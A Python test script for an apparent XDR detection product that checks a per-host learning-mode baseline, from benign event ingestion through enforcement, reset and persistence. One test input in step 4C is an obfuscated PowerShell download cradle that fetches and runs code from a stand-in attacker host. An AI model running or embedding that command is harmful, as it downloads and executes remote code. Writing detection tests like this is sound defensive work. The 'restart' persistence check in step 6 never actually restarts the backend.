"""
CyberFusion XDR Enterprise - Automated Learning Mode Lifecycle Verification
Executes the user's 6-point verification test plan:
1. Generate enough legitimate host events to reach the 50-event threshold.
2. Confirm the profile automatically transitions from LEARNING to ENFORCING.
3. Verify that known benign processes remain benign after enforcement.
4. Verify that unseen suspicious process lineages increase risk without treating every new pair as malicious.
5. Reset the host and confirm it returns to LEARNING.
6. Confirm the learning profile persists correctly across backend restarts.
"""

import os
import sys
import time
import httpx

API_BASE = "http://127.0.0.1:8000"
TEST_HOST = "TEST-HOST-CALIB"

def log(step: str, msg: str):
    print(f"[{step}] {msg}")

def run_lifecycle_verification():
    print("\n" + "="*70)
    print("      CYBERFUSION LEARNING MODE: 6-POINT VERIFICATION SUITE      ")
    print("="*70 + "\n")

    client = httpx.Client(base_url=API_BASE, timeout=10.0)

    # -------------------------------------------------------------
    # STEP 1: Generate legitimate host events to reach threshold
    # -------------------------------------------------------------
    log("STEP 1", f"Resetting test host '{TEST_HOST}' to fresh LEARNING mode (target: 50 events)...")
    res = client.post(f"/api/v1/ml/learning/reset/{TEST_HOST}?target_events=50")
    assert res.status_code == 200, f"Reset failed: {res.text}"
    profile = res.json()
    log("STEP 1", f"Initial profile: State={profile['state']}, Progress={profile['progress']}")

    log("STEP 1", "Streaming 50 diverse, legitimate workstation telemetry events...")
    legitimate_templates = [
        ("explorer.exe", "msedge.exe", "msedge.exe --type=renderer --user-data-dir=C:/Temp"),
        ("code.exe", "git.exe", "git.exe status -s"),
        ("code.exe", "node.exe", "node.exe server.js"),
        ("svchost.exe", "taskhostw.exe", "taskhostw.exe {222A245B-E637-4AE9}"),
        ("explorer.exe", "notepad.exe", "notepad.exe C:/Users/User/notes.txt"),
        ("explorer.exe", "calc.exe", "calc.exe"),
        ("python.exe", "python.exe", "python.exe build_tools.py --clean"),
        ("explorer.exe", "chrome.exe", "chrome.exe --type=utility --field-trial-handle=1234"),
        ("code.exe", "npm.cmd", "npm.cmd run test"),
        ("conhost.exe", "cmd.exe", "cmd.exe /c echo build complete")
    ]

    for i in range(1, 51):
        tpl = legitimate_templates[(i - 1) % len(legitimate_templates)]
        event = {
            "hostname": TEST_HOST,
            "category": "process",
            "action": "process_create",
            "process_name": tpl[1],
            "command_line": tpl[2],
            "parent_process": tpl[0],
            "user_identity": "jishnu_dev",
            "source_ip": "10.0.0.15",
            "mode": "LIVE"
        }
        resp = client.post("/api/v1/ingest/telemetry", json={
            "agent_id": f"CF-AGT-{TEST_HOST}",
            "tenant_id": "tenant-enterprise-secops",
            "data_source": "EDR",
            "mode": "LIVE",
            "events": [event]
        })
        if i in [10, 25, 40, 49, 50]:
            p_res = client.get("/api/v1/ml/learning/profiles")
            current = next((p for p in p_res.json() if p["host_id"] == TEST_HOST), None)
            log("STEP 1", f"Ingested {i}/50 events -> Profile: State={current['state']}, Progress={current['progress']}, Learned Lineages={current['known_lineages_count']}")

    # -------------------------------------------------------------
    # STEP 2: Confirm automatic transition to ENFORCING
    # -------------------------------------------------------------
    p_res = client.get("/api/v1/ml/learning/profiles")
    final_profile = next((p for p in p_res.json() if p["host_id"] == TEST_HOST), None)
    log("STEP 2", f"Checking calibration transition for '{TEST_HOST}'...")
    log("STEP 2", f"Current State: {final_profile['state']} (Target: ENFORCING)")
    log("STEP 2", f"Calibrated Isolation Forest Threshold: {final_profile['calibrated_threshold']}")
    log("STEP 2", f"Learned Unique Binaries: {final_profile['known_binaries_count']}")
    log("STEP 2", f"Learned Allowlisted Lineages: {final_profile['known_lineages_count']}")
    assert final_profile["state"] == "ENFORCING", f"Expected ENFORCING but got {final_profile['state']}"
    log("STEP 2", "[PASS] Successfully auto-graduated to ENFORCING mode!")

    # -------------------------------------------------------------
    # STEP 3: Verify known benign processes remain benign
    # -------------------------------------------------------------
    log("\nSTEP 3", "Testing that observed benign processes remain BENIGN under enforcement...")
    test_benign_cases = [
        {"parent": "code.exe", "name": "git.exe", "cmd": "git.exe status -s"},
        {"parent": "explorer.exe", "name": "msedge.exe", "cmd": "msedge.exe --type=renderer --user-data-dir=C:/Temp"},
        {"parent": "explorer.exe", "name": "notepad.exe", "cmd": "notepad.exe test.txt"}
    ]
    for bc in test_benign_cases:
        res = client.post("/api/v1/ml/analyze", json={
            "hostname": TEST_HOST,
            "parent_process": bc["parent"],
            "process_name": bc["name"],
            "command_line": bc["cmd"]
        })
        data = res.json()
        log("STEP 3", f"  • {bc['parent']} -> {bc['name']}: Verdict={data['verdict']}, Risk={data['risk_score']}/100, is_alert={data.get('is_alert')}")
        assert data["risk_score"] < 50.0 and not data.get("is_alert"), f"False positive detected: {data}"
    log("STEP 3", "[PASS] All known benign processes correctly evaluated as BENIGN (no alerts).")

    # -------------------------------------------------------------
    # STEP 4: Unseen suspicious lineage increases risk without alerting on everything
    # -------------------------------------------------------------
    log("\nSTEP 4", "Verifying selective risk weighting on unseen lineages...")
    
    # 4A. Unseen BENIGN non-LOLBin process (e.g. explorer -> new safe tool)
    res_benign_novel = client.post("/api/v1/ml/analyze", json={
        "hostname": TEST_HOST,
        "parent_process": "explorer.exe",
        "process_name": "hugo.exe",
        "command_line": "hugo.exe server --port 1313"
    })
    d_novel = res_benign_novel.json()
    log("STEP 4", f"  • 4A (Novel Benign Tool): {d_novel['verdict']} (Risk={d_novel['risk_score']}/100, Alert={d_novel.get('is_alert')})")
    assert d_novel["risk_score"] < 50.0 and not d_novel.get("is_alert"), "Novel benign tool falsely alerted!"

    # 4B. Unseen SUSPICIOUS lineage (explorer -> certutil.exe LOLBin)
    res_susp_novel = client.post("/api/v1/ml/analyze", json={
        "hostname": TEST_HOST,
        "parent_process": "explorer.exe",
        "process_name": "certutil.exe",
        "command_line": "certutil.exe -v -dump"
    })
    d_susp = res_susp_novel.json()
    log("STEP 4", f"  • 4B (Unseen Suspicious LOLBin): {d_susp['verdict']} (Risk={d_susp['risk_score']}/100, Alert={d_susp.get('is_alert')})")
    log("STEP 4", f"     Factors: {d_susp['factors']}")
    assert d_susp["risk_score"] >= 35.0, "Unseen LOLBin lineage did not increase risk!"
    assert not d_susp.get("is_alert"), "Unseen LOLBin without attack cradle should not trigger a high alert by itself!"

    # 4C. Unseen Suspicious lineage + Malicious Download Cradle
    res_attack = client.post("/api/v1/ml/analyze", json={
        "hostname": TEST_HOST,
        "parent_process": "winword.exe",
        "process_name": "powershell.exe",
        "command_line": "powershell.exe -nop -w hidden -enc aWV4IChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwOi8vYXR0YWNrZXIuY29tL3AnKQ=="
    })
    d_atk = res_attack.json()
    log("STEP 4", f"  • 4C (Unseen Lineage + Obfuscated Cradle): {d_atk['verdict']} (Risk={d_atk['risk_score']}/100, Alert={d_atk.get('is_alert')})")
    assert d_atk["risk_score"] >= 85.0 and d_atk.get("is_alert"), "Real attack cradle missed!"
    log("STEP 4", "[PASS] Unseen lineage risk modulation verified!")

    # -------------------------------------------------------------
    # STEP 5: Reset the host and confirm it returns to LEARNING
    # -------------------------------------------------------------
    log("\nSTEP 5", f"Resetting host '{TEST_HOST}'...")
    res_reset = client.post(f"/api/v1/ml/learning/reset/{TEST_HOST}?target_events=50")
    d_reset = res_reset.json()
    log("STEP 5", f"Reset Response: State={d_reset['state']}, Progress={d_reset['progress']}, Events={d_reset['events_observed']}")
    assert d_reset["state"] == "LEARNING" and d_reset["events_observed"] == 0, "Reset failed!"
    log("STEP 5", "[PASS] Host successfully returned to LEARNING mode.")

    # -------------------------------------------------------------
    # STEP 6: Confirm learning profile persistence across restart
    # -------------------------------------------------------------
    PERSIST_HOST = "PERSIST-TEST-HOST"
    log("\nSTEP 6", f"Calibrating host '{PERSIST_HOST}' to ENFORCING mode for persistence check...")
    client.post(f"/api/v1/ml/learning/reset/{PERSIST_HOST}?target_events=10")
    for i in range(10):
        client.post("/api/v1/ingest/telemetry", json={
            "agent_id": f"CF-AGT-{PERSIST_HOST}",
            "tenant_id": "tenant-enterprise-secops",
            "data_source": "EDR",
            "mode": "LIVE",
            "events": [{
                "hostname": PERSIST_HOST,
                "category": "process",
                "action": "process_create",
                "process_name": "python.exe",
                "command_line": f"python.exe app_{i}.py",
                "parent_process": "code.exe"
            }]
        })
    # Force finalize and save to disk
    client.post(f"/api/v1/ml/learning/force-enforce/{PERSIST_HOST}")

    # Check file exists on disk
    json_path = os.path.join("backend", "data", "learning_profiles", f"{PERSIST_HOST}.json")
    assert os.path.isfile(json_path), f"Disk file {json_path} was not created!"
    log("STEP 6", f"Verified profile file persisted on disk at: {json_path}")

    # Verify reload
    log("STEP 6", "Verifying profile is loaded from disk...")
    res_profiles = client.get("/api/v1/ml/learning/profiles")
    loaded_profile = next((p for p in res_profiles.json() if p["host_id"] == PERSIST_HOST), None)
    assert loaded_profile is not None and loaded_profile["state"] == "ENFORCING", "Failed to load persisted profile!"
    log("STEP 6", f"Persisted profile verified: State={loaded_profile['state']}, Learned Binaries={loaded_profile['known_binaries_count']}")
    log("STEP 6", "[PASS] Learning profile persistence verified successfully!")

    print("\n" + "="*70)
    print("      ALL 6 VERIFICATION CHECKS PASSED SUCCESSFULLY (100%)       ")
    print("="*70 + "\n")

if __name__ == "__main__":
    run_lifecycle_verification()
